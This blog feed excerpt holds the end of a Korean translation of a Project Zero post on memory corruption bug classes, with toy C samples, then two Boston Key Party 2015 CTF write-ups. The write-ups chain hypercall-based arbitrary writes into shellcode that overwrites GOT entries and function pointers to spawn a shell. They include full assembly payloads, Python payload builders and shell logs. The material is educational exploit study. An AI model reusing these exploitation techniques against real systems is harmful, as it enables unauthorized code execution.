<li>Heap corner-cases (힙 예외들). 힙의 구현체에 따라서, 때론 free가 실행되면서 다른 중요 내부 구조 등이 변경/업데이트 될 수 있다.  흔치 않은 케이스지만, 익스플로잇 시점에서 힙의 상태를 정확히 알 수 없기 때문에 장담하기 힘들다.</li>
<li>오브젝트 사이즈 변동의 영향. 사실 이건 특정 소프트웨어 버젼에 대해서는 익스플로잇의 안정성에 영향을 주지 않지만, 패치가 나와서 중요한 오브젝트의 크기를 크거나 작게 만들어 버림으로써 익스플로잇이 더이상 작동하지 않을 수도 있다.</li>
</ul>
<p>아래의 간단한 코드 샘플은 use-after-free 버그들이 얼마나 영향력이 있을 수 있는지 보여준다:</p><pre class="crayon-plain-tag">// Fedora 20 x64: gcc ./uaf.c
struct unicorn_counter { int num; };

int main() {
    struct unicorn_counter* p_unicorn_counter;
    int* run_calc = malloc(sizeof(int));
    *run_calc = 0;
    free(run_calc);
    p_unicorn_counter = malloc(sizeof(struct unicorn_counter));
    p_unicorn_counter-&gt;num = 42;
    if (*run_calc) execl("/bin/gnome-calculator", 0);
}</pre><p>
&nbsp;</p>
<p><strong>버그 종류: 힙 블럭 내 오버플로우 및 상대적 overwrite</strong><br />
힙 블럭내 오버플로우나 상대적인 오버라잇은 매우 강력한 익스플로잇 기반을 제공한다. 이번에는 샘플 코드부터 보자:</p><pre class="crayon-plain-tag">// Fedora 20 x64: gcc ./intraheap.c
struct goaty { char name[8]; int should_run_calc; };

int main(int argc, const char* argv[]) {
    struct goaty* g = malloc(sizeof(struct goaty));
    g-&gt;should_run_calc = 0;
    strcpy(g-&gt;name, "projectzero");
    if (g-&gt;should_run_calc) execl("/bin/gnome-calculator", 0);
}</pre><p>
이 같은 버그는 무지 강력한데, 왜냐하면 메모리 코럽션이 힙 블럭 경계를 넘지 않기 때문이다. 그러므로, 알 수 없는 힙 상태 때문에 생겼던 불확실성이나 비결정성과 같은 문제가 사라져버린다. 힙의 상태가 어떻든지 상관없이 같은 데이터를 주면 항상 같은 코럽션이 일어난다. 이런 종류의 버그들은 100% 안정성의 익스플로잇으로 진전될 가능성이 매우 크다. <a href="https://code.google.com/p/google-security-research/issues/detail?id=251" target="_blank" title="">Bug 251</a>은 힙 블럭 안에서 일어난 버퍼 오버플로우의 리얼월드 예제이다. <a href="https://code.google.com/p/google-security-research/issues/detail?id=265" target="_blank" title="">Bug 265</a>는 흔치 않은 케이스긴 하지만 인덱싱 에러를 통해 out-of-bounds write이 일어나지만 하나의 힙 블럭안에서만 제한되는 흥미로운 예제라고 할 수 있다. 트리거하는 방식 또한 재밌다: 가상 펜으로 가상 화면에 글자들을 쓰는 프로토콜이었는데, 프로토콜 메세지를 통해 가상 펜의 위치를 화면 밖의 위치로 설정했다! 제공된 PoC로 매번 같은 메모리 주소 (0x2000000000)를 free하면서 크래쉬를 낼 수 있었다.</p>
<p>&nbsp;</p>
<p><strong>버그 종류: 타입 컨퓨젼 (type confusion)</strong><br />
타입 컨퓨젼 버그 역시 100% 안정성을 가진 익스플로잇을 만들 수 있는 기반을 제공할 수 있는 아주 강력한 녀석이다. 타입 컨퓨젼 버그를 트리거되는 상황을 보면, 코드가  A 타입(API 타입)이라고 믿고 있는 어떤 오브젝트에 대한 레퍼런스를 가지고 있지만, 코드가 헷갈린거고 사실은 해당 오브젝트는 B 타입(in-memory 타입) 인것이다. A 타입과 B 타입의 메모리에서의 구조가 어떠냐에 따라서 매우 이상하지만 대게 완전히 결정적인 사이드 이펙트가 일어날 수 있다. 코드 샘플을 봐 보자:</p><pre class="crayon-plain-tag">// Fedora 20 x64: gcc ./confused.cc -lstdc++
#include &lt;unistd.h&gt;

class IShouldRunCalculator { public: virtual bool UWannaRun() = 0; };

class CalculatorDecider final : public IShouldRunCalculator {
public:
    CalculatorDecider() : m_run(false) {}
    virtual bool UWannaRun() { return m_run; }
private: bool m_run;
};

class DelegatingCalculatorDecider final : public IShouldRunCalculator {
public:
    DelegatingCalculatorDecider(IShouldRunCalculator* delegate) : m_delegate(delegate) {}
    virtual bool UWannaRun() { return m_delegate-&gt;UWannaRun(); }
private: IShouldRunCalculator* m_delegate;
};

int main() {
    CalculatorDecider nonono;
    DelegatingCalculatorDecider isaidno(&amp;nonono);
    IShouldRunCalculator* decider = &amp;isaidno;
    CalculatorDecider* confused_decider = reinterpret_cast&lt;CalculatorDecider*&gt;(decider);
    if (confused_decider-&gt;UWannaRun()) execl("/bin/gnome-calculator", 0);
}</pre><p>
코드에서 보다시피, 전반적으로 계산을 하지 말도록 시도하고 있지만, 타입 컨퓨젼 때문에 CalculatorDecider::UWannaRun() 함수가 실제로는 (null이 아닌) 포인터가 있는 메모리 값에 대해서 boolean 체크를 하게 된다. 그래서 결국엔 항상 계산을 하게 된다. (라고 말했지만 정말일까? 필자의 머신에서는 안정적으로 항상 계산기를 띄웠지만, 여기엔 비결정성의 요소가 숨어있다. 이게 무엇인지는 생각하는건 독자들의 몫으로 남기도록 하겠다.)</p>
<p>실제 프로그램에서 발생한 타입 컨퓨젼 버그와 익스플로잇의 좋은 예제/설명은 2013년 Pwn2Own에 구글 크롬을 상대로 참가했던 <a href="https://labs.mwrinfosecurity.com/blog/2013/04/19/mwr-labs-pwn2own-2013-write-up---webkit-exploit/" target="_blank" title="">MWR Infosecurity의 블로그 포스트</a>에서 볼 수 있다. 흥미롭게도, 버그가 쉽게 100% 안정적인 익스플로잇으로 연결되지 않은 케이스다. 이 경우에는 훨씬 큰 API 타입에 비해서 작은 in-memory 타입의 컨퓨젼이 있었다. API 타입에 있는 필드들에 대한 오프셋이 in-memory 타입의 사이즈보다 큰 바람에,  필드들을 참조할 때 거의 모두 힙 경계를 넘어서 액세스하게 된 것이다. 위에서 본 것처럼, 힙 경계를 넘는건 안정성을 위해서는 &#8220;ㄴㄴ&#8221;다. 다음 그림이 타입 컨퓨젼에서의 멤버 사용의 큰 두가지 가능성을 보여준다. 왼쪽에 있는 오브젝트는 컴파일러가 (잘못된 캐스팅 때문에) 생성한 코드에서 쓰이는 오브젝트를 나타낸다. 하지만 런타임에서는 가르켜진 오브젝트 메모리가 더 작게되는데 메모리에서의 타입이 다르기 때문이다. 런타임 오브젝트의 바운드 안에 있는 참조들은 예측한대로 작동할 것이다 &#8212; ASLR을 무력화하는데 쓰일 수 있는 GetSize() 메소드를 통한 infoleak 처럼 말이다. 그에 비해, 힙 경계를 넘어서 참조하는 경우는 out-of-bounds 액세스이고, 그렇기 때문에 결정적으로 작동하지 않을 확률이 크다 &#8212; SetFlags() 메소드를 통한 메모리 변조 처럼 말이다.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/07/img1.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter size-full wp-image-2013" src="https://www.bpak.org/blog/wp-content/uploads/2015/07/img1.png" alt="" width="624" height="367" /></a></p>
<p>&nbsp;</p>
<p><strong>케이스 스터디: ShaderParameter 힙 코럽션, 올드스쿨 방법으로.</strong><br />
이번 포스팅은 버그의 안정성 (reliability)에 대해서 설명했는데, 이제와서 불안정한(unreliable) 익스플로잇을 소개하려고 한다는게 이상해 보일 수 있다. 하지만 이건 간단한데서 부터 시작해서 똑같은 버그들을 가지고 더욱 더 안정적인 것을 만들어내는 과정을 위해서이다. 일단 불안정한 익스플로잇으로 시작해서 훌륭한 안정성을 가질때까지 보완해보도록 하겠다.</p>
<p>그래서 이번 포스팅은 최근에 패치된 Adobe Flash를 공격하는걸로 끝을 내볼까 한다. <a href="https://code.google.com/p/google-security-research/issues/detail?id=324" target="_blank" title="">Bug 324</a>인데, ShaderParameter ActionScript 클래스에 관련해서 out-of-bounds write이 가능한 녀석이다. 공격자는 shader 프로그램에서 상대적인 비정상적인 인덱스에 원하는 32-bit 값을 쓸 수 있고, 큰 인덱스를 사용하게 되면 힙 블럭의 끝 부분에 out-of-bounds write을 할 수 있게 된다.<b></b></p>
<p>이러한 out-of-bounds write 도구가 있으면, 요즘엔 Adobe Flash를 공격하는 꽤나 전형적인 방식이 있다: heap grooming을 이용해서 <em>Vector.&lt;uint&gt;</em> 버퍼 오브젝트를 덮어쓰는 오브젝트의 뒤에 오도록 유도하는것이다. 덮어쓰면서 <em>Vector</em>의 길이 (length) 필드를 수정하게 되고, 결과적으로 <em>Vector</em> 오브젝트 이후의 프로세스 메모리를 맘대로 읽거나 쓸 수 있게 된다.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/07/bla2.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter size-full wp-image-2018" src="https://www.bpak.org/blog/wp-content/uploads/2015/07/bla2.png" alt="" width="624" height="317" /></a></p>
<p>어느정도 주석처리 된 Linux x64 익스플로잇이 <a href="https://code.google.com/p/google-security-research/issues/detail?id=324" target="_blank">여기</a>에 첨부되어있다. 딱히 안정성을 높이기 위한 노력은 안했다; 아마 훨씬 더 안정적으로 만들 수 있기는 할테지만 말이다. 힙 블럭 경계를 넘어서 메모리 변조를 시키기 때문에 이 익스플로잇을 가지고는 위에 언급한대로 100% 안정성을 얻기는 어렵다.</p>
<p>Adobe가 이 버그를 고치기 위한 패치를 릴리즈한 이후에 (하지만 우리가 이 버그에 대한 자세한 정보는 내놓기 훨씬 이전에), <a href="http://malware.dontneedcoffee.com/2015/06/cve-2015-3105-flash-up-to-1700188-and.html">제로데이는 아니지만 exploit pack들에서 이미 해당 버그의 익스플로잇들이 보이기 시작했다</a>. 뭐 공격자들이 바이너리 비교 (diffing)에 있어서 빠르거나, MAPP 정보통이 있거나, 이미 해당 취약점을 타겟팅 공격에 쓰고 있었을 수도 있다. 하지만 이 &#8216;사건&#8217;이 일어난 덕분에 같은 버그에 대한 다른 익스플로잇을 분석할 핑계를 줬는데 &#8212; <a href="https://twitter.com/HaifeiLi/status/613017967547146240">@HaifeiLi에 의하면</a> 여기서 사용된 것들도 <em>Vector</em> 공격 기법을 사용했다더라.</p>
<p>일단 이번 포스팅은 해당 버그에 대한 얘기가 아직 끝나지 않았다는 약속과 함께 여기서 마치는걸로 하겠다. 이번 시리즈의 다음 포스팅에서는 &#8220;이 버그를 좀 더 안정적으로 쓸 수 있을까?&#8221;라는 질문을 던질 것이다. 그리고, 예상할 수 있겠지만, 대답은 yes가 될 것이다.</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2015/07/%eb%b2%88%ec%97%ad-what-is-a-good-memory-corruption-vulnerability-project-zero/feed/</wfw:commentRss>
		<slash:comments>3</slash:comments>
		</item>
		<item>
		<title>[bkpCTF-2015] braintree (tz) write-up</title>
		<link>https://www.bpak.org/blog/2015/03/bkpctf-2015-braintree-tz-write-up/</link>
		<comments>https://www.bpak.org/blog/2015/03/bkpctf-2015-braintree-tz-write-up/#comments</comments>
		<pubDate>Sun, 08 Mar 2015 00:12:26 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Hacking/PPP]]></category>
		<category><![CDATA[2015]]></category>
		<category><![CDATA[bkpCTF]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[PPP]]></category>
		<category><![CDATA[pwnable]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=1967</guid>
		<description><![CDATA[This is a write-up for braintree challenge, which is the last part of 3-chained pwnable challenge from Boston Key Party CTF last weekend. You can read about the other parts here: quincy-center, quincy-adams. The binaries were packaged&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>This is a write-up for <strong>braintree</strong> challenge, which is the last part of 3-chained pwnable challenge from <a href="https://ctftime.org/event/163" target="_blank" title="">Boston Key Party CTF</a> last weekend. You can read about the other parts here: <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-center-uspace-write-up/" target="_blank" title="">quincy-center</a>, <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-adams-kspace-write-up/" target="_blank" title="">quincy-adams</a>.</p>
<p>The binaries were packaged into a <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/zenhv-e941cb4585deafcf5a1b86050a3ebe7a.gz" target="_blank" title="">tar ball</a>.</p>
<blockquote><p>The MBTA wrote a cool system. It&#8217;s pretty bad though, sometimes the commands work, sometimes they don&#8217;t&#8230;<br />
Exploit it. (tz flag) 54.165.91.92 8899</p></blockquote>
<p>The goal is to get &#8220;tz&#8221; flag by exploiting the kernel space process.</p>
<p><span style="text-decoration: underline;"><em>If you haven&#8217;t read the previous write-up for quincy-adams, I strongly recommend you to read before continuing with this one as we will assume knowledge gained from it.</em></span></p>
<p>&nbsp;</p>
<p>As it was mentioned previously, we will be using the same primitive: <strong>hypercall #92</strong>.</p>
<p>Therefore, we have an arbitrary-write-anywhere primitive. So, the question is &#8220;what can we overwrite in <strong>tz</strong> that will get us an arbitrary code execution?&#8221;</p>
<p>We started looking at each of the hypercall handlers in <strong>tz</strong>.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter  wp-image-1949" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" alt="" width="593" height="496" /></a></p>
<p>&nbsp;</p>
<p>Then, we stumbled upon hypercall #85.</p>
<p>This function seemed like some sort of cleanup (we called it <strong>delete_op</strong> in our shellcode) function for an object used in <strong>tz</strong>.<br />
(As I said previously, we didn&#8217;t do much of reversing on <strong>tz</strong> as we did for <strong>uspace</strong> and <strong>kspace</strong>)</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/tz_0.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter  wp-image-1970" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/tz_0.png" alt="" width="424" height="565" /></a></p>
<p>It seems like the first argument (v3) is a word that represents id of some sort, but the important thing is that we can control its value. v2 is an offset to the tz data structure, and the value at <strong>tz_space + v2 (where v2 is 0)</strong> is 0.</p>
<p>Since NX is enabled on <strong>tz</strong>, we decided to overwrite the GOT entry to execute <strong>system</strong>. Since the addresses are randomized, we first need to leak an address to calculate the address of system. We are going to abuse the hypercall #92 to do 3 things:</p>
<ul>
<li>Leak out libc address, so we can calculate the address of system.</li>
<li>Overwrite <strong>free</strong> (.got.plt in tz) with &amp;system.</li>
<li>Overwrite contents in <strong>v4 + 8</strong> (aka, tz_space + 8) with a pointer to our command buffer.</li>
</ul>
<p>However, doing all of these comes with a price. The size limit (256 bytes) starts to become an issue here. We can either put another stager in the middle to allow us more space, or optimize our payload such that it fits under 256 bytes! We chose to do latter :P</p><pre class="crayon-plain-tag">[BITS 64]

section .text
global _start
_start:

; yay we are in kernel!!!
; optimizing for size...
mov ebp, 0x8

; leak out &amp;getpwnam
mov eax, 0x402380       ; do_encrypt
mov edi, 0x602290       ; src (getpwnam .got.plt in tz)
mov rsi, [rel dst]      ; dst (kernel_space + 128)
mov edx, ebp            ; size
call rax

call sleep

; update the address (to be &amp;system) and
; xor the address back with the key
mov rcx, [rel dst]
mov rax, [rcx]
xor rax, [rel xor_key]
sub rax, 0x79340        ; &amp;getpwnam - &amp;system (this may be different depending on libc)
xor rax, [rel xor_key]
mov [rcx], rax

; overwrite free GOT
mov eax, 0x402380       ; do_encrypt
mov rdi, [rel dst]      ; src (kernel_space + 128)
mov esi, 0x602230       ; dst (free .got.plt in tz)
mov edx, ebp            ; size
call rax

call sleep

mov rax, [rel command]  ; encrypt our command pointer
xor rax, [rel xor_key]
push rax

; overwrite [fake_obj + 8] with cmd pointer
mov eax, 0x402380       ; do_encrypt
mov rdi, rsp
mov rsi, [rel fake]
mov edx, ebp            ; size
call rax

call sleep

; setting command to 'sh'
mov rcx, [rel command]
mov dword [rcx], 0x6873

; hypercall to trigger free
; sem_lock
mov ebp, [0x60338C]     ; semaphore
mov edi, ebp
xor esi, esi
mov eax, 0x4015D0
call rax

xor rcx, rcx
mov rax, [0x603360]     ; kernel_space
mov dword [rax], 85     ; delete_op hypercall
mov [rax + 8], rcx      ; 0
lea rdx, [rax + 48]     ; rax + 48 points to args
mov [rax + 16], rdx

mov word [rax + 48], 0  ; id

; sem_unlock
mov edi, ebp
xor esi, esi
mov eax, 0x401600
call rax

call sleep

sleep:
; sleep(1)
mov eax, 0x400D00
xor edi, edi
inc edi
jmp rax

dst:
dq 0x900000080         ; scratch pad in kernel_space
fake:
dq 0x100000008         ; tz_space + 8
xor_key:
dq 0x7473656c72616863
command:
dq 0x900001000         ; we will put our command here</pre><p>
At first, we were over ~10 bytes, but once we have &#8220;optimized&#8221; a little bit, we finally got our payload to be 254 bytes!</p>
<p>Note that we are not using the same shell.asm as before (our new payload is now called shell.asm). However, we can continue to use the same stage1.asm and the python script from <strong>kspace</strong> exploit. For convenience sake, it is also attached here.</p><pre class="crayon-plain-tag">#!/usr/bin/python
import struct

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):
    return struct.unpack('&lt;Q', v)[0]

f = open('payload', 'wb')

f.write('create lol\n'.ljust(0x400, '#'))
f.write(open('shell.bin').read().ljust(0x100, '\0'))

pop_pop_ret = 0x40110F
stage1 = open('stage1.bin').read()

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + stage1 + '\n').ljust(0x400, '#'))</pre><p>
</p><pre class="crayon-plain-tag">$ nasm shell.asm -f bin -o shell.bin
$ ls -l shell.bin 
-rw-rw-r-- 1 user user 254 Mar 4 21:58 shell.bin
$ nasm stage1.asm -f bin -o stage1.bin
$ python pwn_tz.py
$ (cat ../tz/payload; cat -) | sudo ./tz
bksh&gt; bksh&gt; bksh&gt;
whoami
tz</pre><p>
&nbsp;</p>
<p>We have abused the hypercall #92 (encrypt) to exploit both kspace and tz, but there may be another way to exploit kspace without going through the hypervisor.</p>
<p>Well, that&#8217;s it for the 3-parts pwnable challenge write-up =)</p>
<p>Thank you for reading, and happy hacking!</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2015/03/bkpctf-2015-braintree-tz-write-up/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
		</item>
		<item>
		<title>[bkpCTF-2015] quincy-adams (kspace) write-up</title>
		<link>https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-adams-kspace-write-up/</link>
		<comments>https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-adams-kspace-write-up/#respond</comments>
		<pubDate>Sun, 08 Mar 2015 00:10:45 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Hacking/PPP]]></category>
		<category><![CDATA[2015]]></category>
		<category><![CDATA[bkpCTF]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[PPP]]></category>
		<category><![CDATA[pwnable]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=1935</guid>
		<description><![CDATA[This is a write-up for quincy-adams challenge, which is the second part of 3-chained pwnable challenge from Boston Key Party CTF last weekend. You can read about the other parts here: quincy-center, braintree. The binaries were packaged&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>This is a write-up for <strong>quincy-adams</strong> challenge, which is the second part of 3-chained pwnable challenge from <a href="https://ctftime.org/event/163" target="_blank" title="">Boston Key Party CTF</a> last weekend. You can read about the other parts here: <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-center-uspace-write-up/" target="_blank" title="">quincy-center</a>, <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-braintree-tz-write-up/" target="_blank" title="">braintree</a>.</p>
<p>The binaries were packaged into a <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/zenhv-e941cb4585deafcf5a1b86050a3ebe7a.gz" target="_blank" title="">tar ball</a>.</p>
<blockquote><p>The MBTA wrote a cool system. It&#8217;s pretty bad though, sometimes the commands work, sometimes they don&#8217;t&#8230;<br />
Exploit it. (kspace flag) 54.165.91.92 8899</p></blockquote>
<p>The goal is to get &#8220;kspace&#8221; flag by exploiting the kernel space process.</p>
<p>&nbsp;</p>
<p>Before we dive in, let&#8217;s look at what is really going on.</p>
<p>We can think of each process (tz, kspace, uspace) as a separate privilege ring, as their name suggest.</p>
<ul>
<li><strong>tz</strong> (TrustZone?) &#8211; a &#8220;hypervisor&#8221; layer that implements the &#8220;hypercalls&#8221; (we haven&#8217;t really reversed this too much).</li>
<li><strong>kspace</strong> &#8211; a kernel layer that implements the &#8220;syscalls&#8221;; it maintains the files array and performs the actual tasks such as listing files, removing files, sleeping, and cat&#8217;ing (open &amp; read).</li>
<li><strong>uspace</strong> &#8211; a user layer that implements the interface that the user interacts with; it parses the commands and calls the appropriate &#8220;syscalls&#8221;.</li>
</ul>
<p>We would start from the <strong>uspace</strong> to get an arbitrary code execution on <strong>uspace</strong> process (as we did in previous write-up), then exploit the <strong>kspace</strong> to allow us to perform an attack against <strong>tz</strong>. Shared memory is arranged by <strong>tz</strong>, such that each layer will get its own memory &#8220;space&#8221; to pass the arguments to {sys, hyper}calls.</p>
<div id="attachment_1942" style="width: 685px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_0.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1942" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_0.png" alt="" width="675" height="496" /></a><p class="wp-caption-text">kspace syscall_handler (sub_401180)</p></div>
<p>&nbsp;</p>
<p>We can see that the syscall numbers, which is stored on <strong>user_space[0]</strong>, match with what we saw on <strong>uspace</strong>.</p>
<ul>
<li><strong>do_ls</strong> loops through the <strong>file_array</strong> list and prints out the name of the file.</li>
<li><strong>do_rm</strong> finds the file in <strong>file_array</strong> with a given filename, and deletes it.</li>
<li><strong>do_create</strong> adds a file into <strong>file_array</strong> up to 16 files. It looks for the spot/bin in the array by checking if the filename is null.<br />
This also initializes the file structure:</p>
<ul>
<li><strong>open_file</strong>, <strong>read_file</strong>, and <strong>delete_file</strong> are the function pointers.
<div id="attachment_1943" style="width: 579px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_1.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1943 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_1.png" alt="" width="569" height="272" /></a><p class="wp-caption-text">file struct</p></div></li>
</ul>
</li>
<li>Note that <strong>syscall 95</strong> and <strong>99</strong> are <strong>sleep</strong> and <strong>exit</strong>, respectively, which are not that interesting :p</li>
<li><strong>do_read</strong> finds the file in <strong>file_array</strong> with a given filename, and if the file is &#8220;open&#8221;, its content is copied to the output buffer (2nd argument).</li>
<li><strong>do_open</strong> finds the file in <strong>file_array</strong> with a given filename, and changes its open state.
<ul>
<li>Only up to 9 files can be open simultaneously.</li>
</ul>
</li>
</ul>
<p>There is a bug with file creation and deletion, where the number of files in the list gets incremented when creating a file, but it does not get decremented when being deleted. Thus, we can only create up to 16 files and we can&#8217;t create any more file even if we delete some. This didn&#8217;t really affect the exploitation, however :)</p>
<p>If you followed carefully, you&#8217;d have noticed that we didn&#8217;t go over the mysterious <strong>syscall 92</strong> (sub_402380).</p>
<p>This operation, unlike other ones, does not process the user input/arguments here. Instead, it forwards these arguments to <strong>tz</strong> via the &#8220;hypercall&#8221;.</p>
<div id="attachment_1948" style="width: 526px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_2.png" data-rel="lightbox-image-2" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1948 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_2.png" alt="" width="516" height="420" /></a><p class="wp-caption-text">syscall 92 (kspace)</p></div>
<p>&nbsp;</p>
<p>To be more precise, the 3 arguments are stored starting at <strong>kernel_space + 48</strong>, and the hypercall takes 3 arguments of the <strong>hypercall number (92)</strong>, <strong>0</strong>, and the <strong>pointer to the arguments (kernel_space + 48)</strong>.</p>
<p>So what does this hypercall do? Let&#8217;s take a look at <strong>tz</strong> binary now.</p>
<div id="attachment_1949" style="width: 545px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" data-rel="lightbox-image-3" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1949 " src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_3.png" alt="" width="535" height="447" /></a><p class="wp-caption-text">hypercall handler (tz)</p></div>
<p>As we can see above, <strong>sub_401560</strong> is the hypercall 92 handler.<br />
It doesn&#8217;t really do anything too fancy. The function performs a very simple &#8220;encryption&#8221; of data.</p>
<div id="attachment_1951" style="width: 942px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_4.png" data-rel="lightbox-image-4" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1951 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/kspace_4.png" alt="" width="932" height="481" /></a><p class="wp-caption-text">hypercall 92 handler</p></div>
<p>&nbsp;</p>
<p>It basically <strong>xor</strong>&#8216;s the bytes at <strong>src</strong> with the <strong>key</strong> &#8220;charlestown isn&#8217;t that skeytchy.&#8221; and stores the result to <strong>dest</strong>.</p>
<p>There is no restriction on the memory address for <strong>dest</strong> (other than checking if it&#8217;s 0x100000000), which allows us to do <span style="text-decoration: underline;">arbitrary (xor) write</span>. By preparing the <strong>src</strong> buffer with already xor&#8217;d values, we can write any value we want to any memory location.</p>
<p>So, we can use this capability(?) to write useful data structure (such as a function pointer) to gain arbitrary code execution!</p>
<p>Just like <strong>uspace</strong>, <strong>kspace</strong> has NX disabled, so we can put our shellcode somewhere and jump to it.</p>
<p>&nbsp;</p>
<p>The attack plan is as follows:</p>
<ol>
<li>Create a file, with the content being the shellcode we want to run as kernel.</li>
<li>Overwrite a function pointer (open_file) for the first file (which is the one that we just created in step 1) with the pointer to our shellcode.
<ul>
<li>The <strong>file_array</strong> is located at kernel_space + 0x3E800 == <strong>0x90003e800</strong>.</li>
<li>According to our <strong>struc_files</strong> struct, file_array <strong>+ 0x8</strong> points to the <strong>files</strong> array.</li>
<li>Thus, the first file structure will be located at <strong>0x90003e808</strong> and according to our <strong>struc_file</strong>, its content is located at the offset <strong>+0x9</strong>.</li>
<li>The first file&#8217;s content == <strong>shellcode</strong> == 0x90003e800 + 0x8 + 0x9 == <strong>0x90003e811</strong>.</li>
<li>The first file&#8217;s <strong>open_file</strong> function pointer is at <strong>+0x118</strong> from the file structure, which makes its location <strong>0x90003e920</strong>.</li>
</ul>
</li>
<li>Invoke a syscall #93, which opens a file.
<ul>
<li>At this point, we will tell it to open our file which has corrupted <strong>open_file</strong> function pointer &#8212; thus, calling into our shellcode.</li>
</ul>
</li>
</ol>
<pre class="crayon-plain-tag">[BITS 64]

section .text
global _start
_start:

; sem_lock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401A90
call rax

; syscall 92 (encrypt)
push qword [rel data]       ; 0x90003e811 (xor'd)
mov rax, [0x602498]         ; user_space
mov qword [rax], 92         ; syscall #92
mov qword [rax + 8], rsp    ; src (ptr to data)
mov rcx, [rel dst]          ;
mov qword [rax + 16], rcx   ; dst (0x90003e920)
mov qword [rax + 24], 0x8   ; len

; sem_unlock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401AC0
call rax

; sleep(1)
mov rdi, 1
mov rax, 0x400C30
call rax

; sem_lock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401A90
call rax

; syscall 93 (open)
push qword [rel data]       ; now has 0x90003e811
mov rax, [0x602498]         ; user_space
mov qword [rax], 93         ; syscall #93
lea rcx, [rax + 16]         ; (using user_space + 16 as scratch)
mov qword [rax + 8], rcx    ; filename
mov rcx, [rel lol]
mov qword [rax + 16], rcx   ; filename &lt;- &amp;("lol")

; sem_unlock(sem_io, 0)
mov edi, [0x6024a8]
xor esi, esi
mov eax, 0x401AC0
call rax

data:
dq 0x7473656572628072   ; 0x90003e811 ^ 0x7473656c72616863 (key)
dst:
dq 0x90003e920
lol:
db 'lol',0</pre>
Note that since we are using syscal #92 (encrypt) to perform an arbitrary write to memory, we have to &#8220;encrypt&#8221; the value we want to write beforehand such that it will get &#8220;decrypted&#8221; when it writes. The filename we used is &#8220;lol&#8221;.<br />
<pre class="crayon-plain-tag">#!/usr/bin/python
import struct

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):
    return struct.unpack('&lt;Q', v)[0]

f = open('payload', 'wb')

f.write('create lol\n'.ljust(0x400, '#'))
f.write(open('shell.bin').read().ljust(0x100, '\0'))

pop_pop_ret = 0x40110F
stage1 = open('stage1.bin').read()

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + stage1 + '\n').ljust(0x400, '#'))</pre>
Our exploit code looks fairly similar, but we now create a file called &#8216;lol&#8217; first with the shellcode. (The shellcode is the same as what we used for uspace.)</p>
<p>Then, we trigger the bug with our stage1 code.</p><pre class="crayon-plain-tag">$ nasm shell.asm -f bin -o shell.bin
$ nasm stage1.asm -f bin -o stage1.bin
$ python pwn_kspace.py
$ (cat ../kspace/payload; cat -) | sudo ./tz
bksh&gt; bksh&gt; bksh&gt;
whoami
kspace</pre><p>
&nbsp;</p>
<p>So far, we have triggered a <strong>uspace</strong> bug to call a syscall (92) in <strong>kspace</strong>, which does a hypercall (92) in <strong>tz</strong>, which allowed us to perform an arbitrary memory write in <strong>kspace </strong>memory.</p>
